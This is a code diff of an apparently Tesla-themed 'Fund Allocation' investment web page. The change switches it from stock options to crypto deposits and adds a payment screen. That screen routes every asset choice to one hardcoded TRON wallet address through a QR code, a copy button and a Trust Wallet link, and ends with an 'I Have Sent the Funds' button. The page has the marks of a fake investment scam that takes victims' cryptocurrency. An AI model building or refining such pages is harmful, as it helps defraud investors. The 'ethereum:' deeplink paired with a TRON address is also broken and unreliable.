@@ -20,7 +20,8 @@
     </header>
 
     <main class="max-w-md w-full mx-auto px-4 mt-6 flex-grow">
-        <div class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl">
+        <!-- Input Form Screen -->
+        <div id="formCard" class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl">
             <h2 class="text-xl font-bold tracking-tight mb-1">Fund Allocation</h2>
             <p class="text-xs text-neutral-400 mb-6">Select your transaction profile parameters.</p>
 
@@ -28,11 +29,11 @@
 
             <form id="investForm" class="space-y-5">
                 <div>
-                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Deposit Target Class</label>
+                    <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Select Crypto Asset</label>
                     <select id="assetSelect" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
-                        <option value="Tesla Stock (TSLA)">Tesla Common Stock (TSLA)</option>
-                        <option value="Cash Reserves">USD Vault Cash Balance</option>
-                        <option value="Digital Assets Venture">Digital Venture Tier Holdings</option>
+                        <option value="USDT (TRC20)">USDT (TRON Network - TRC20)</option>
+                        <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+                        <option value="Ethereum (ETH)">Ethereum (ERC20)</option>
                     </select>
                 </div>
 
@@ -51,6 +52,58 @@
                 </button>
             </form>
         </div>
+
+        <!-- Automatic Crypto Payment Screen -->
+        <div id="paymentCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-5 shadow-2xl text-center space-y-5">
+            
+            <!-- Dynamic Trust Wallet Warning Banner from image_7.png -->
+            <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2.5">
+                <span class="text-[#f0a23e] text-sm mt-0.5">⚠️</span>
+                <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
+                    Only send <span id="bannerAsset">Tether USDT (TRC20)</span> assets to this address. Other assets will be lost forever.
+                </p>
+            </div>
+
+            <!-- QR Container -->
+            <div class="bg-white rounded-2xl p-4 inline-block shadow-lg">
+                <img id="qrCodeImg" src="" alt="Deposit QR Code" class="w-44 h-44 mx-auto">
+                <p class="text-[11px] text-neutral-500 font-bold tracking-tight mt-2" id="walletLabel">USDT (Tron)</p>
+            </div>
+
+            <div class="space-y-3 text-left">
+                <!-- Amount Segment -->
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Amount Due</label>
+                    <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-3 text-sm font-mono font-bold text-white">
+                        0.00
+                    </div>
+                </div>
+
+                <!-- Destination Wallet with Native Clipboard Copy Action -->
+                <div>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Your Destination Address</label>
+                    <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-3 font-mono text-xs text-neutral-300 flex justify-between items-center gap-3">
+                        <span id="walletAddress" class="break-all tracking-tight select-all">TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6</span>
+                        <button type="button" id="copyBtn" onclick="copyWalletAddress()" class="bg-neutral-800 hover:bg-neutral-700 active:bg-neutral-600 p-2.5 rounded-lg transition-all flex items-center justify-center shrink-0 border border-neutral-700">
+                            <svg id="copyIcon" class="w-4 h-4 text-neutral-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+                            </svg>
+                            <span id="copyTxt" class="hidden text-[10px] font-bold text-emerald-400 px-1">Copied!</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Deep Link Action Routing Grid -->
+            <div class="pt-2 space-y-2.5">
+                <a id="trustWalletLink" href="#" class="w-full bg-[#0052FF] hover:bg-[#0045d8] text-white font-medium py-3.5 rounded-xl block transition-all text-sm shadow-lg tracking-wide font-semibold">
+                    Pay via Trust Wallet
+                </a>
+                <a href="dashboard.html" class="w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-400 font-medium py-3 rounded-xl block transition-all text-xs border border-neutral-800">
+                    I Have Sent the Funds
+                </a>
+            </div>
+        </div>
     </main>
 
     <script>
@@ -59,6 +112,30 @@
 
         if (!userId) {
             window.location.href = "index.html";
+        }
+
+        async function copyWalletAddress() {
+            const addressText = document.getElementById('walletAddress').innerText;
+            const copyIcon = document.getElementById('copyIcon');
+            const copyTxt = document.getElementById('copyTxt');
+
+            try {
+                await navigator.clipboard.writeText(addressText);
+                copyIcon.classList.add('hidden');
+                copyTxt.classList.remove('hidden');
+                setTimeout(() => {
+                    copyTxt.classList.add('hidden');
+                    copyIcon.classList.remove('hidden');
+                }, 2000);
+            } catch (err) {
+                // Fallback option
+                const el = document.createElement('textarea');
+                el.value = addressText;
+                document.body.appendChild(el);
+                el.select();
+                document.execCommand('copy');
+                document.body.removeChild(el);
+            }
         }
 
         document.getElementById('investForm').addEventListener('submit', async (e) => {
@@ -70,11 +147,15 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "Transmitting processing arrays...";
 
+            const amount = parseFloat(document.getElementById('investAmount').value);
+            const asset = document.getElementById('assetSelect').value;
+            const address = document.getElementById('walletAddress').innerText;
+
             const payload = {
                 action: "submitInvestment",
                 userId: userId,
-                amount: parseFloat(document.getElementById('investAmount').value),
-                asset: document.getElementById('assetSelect').value
+                amount: amount,
+                asset: asset
             };
 
             try {
@@ -88,13 +169,18 @@
                 const result = await response.json();
 
                 if (result.status === "success") {
-                    statusBox.className = "mb-4 p-4 text-sm rounded-xl border bg-emerald-950/30 border-emerald-900 text-emerald-400";
-                    statusBox.innerText = "Capital submission recorded. Redirecting to account deck...";
-                    statusBox.classList.remove('hidden');
+                    document.getElementById('payAmountDisplay').innerText = `${amount} USD (${asset.split(' ')[0]})`;
+                    document.getElementById('bannerAsset').innerText = asset;
+                    document.getElementById('walletLabel').innerText = asset;
                     
-                    setTimeout(() => {
-                        window.location.href = "dashboard.html";
-                    }, 2000);
+                    // QR Generation pointing accurately to your target key address
+                    document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(address)}`;
+                    
+                    // Trust Wallet launch deeplink configuration
+                    document.getElementById('trustWalletLink').href = `ethereum:pay?target=${address}&value=${amount}`;
+
+                    document.getElementById('formCard').classList.add('hidden');
+                    document.getElementById('paymentCard').classList.remove('hidden');
                 } else {
                     throw new Error(result.message);
                 }
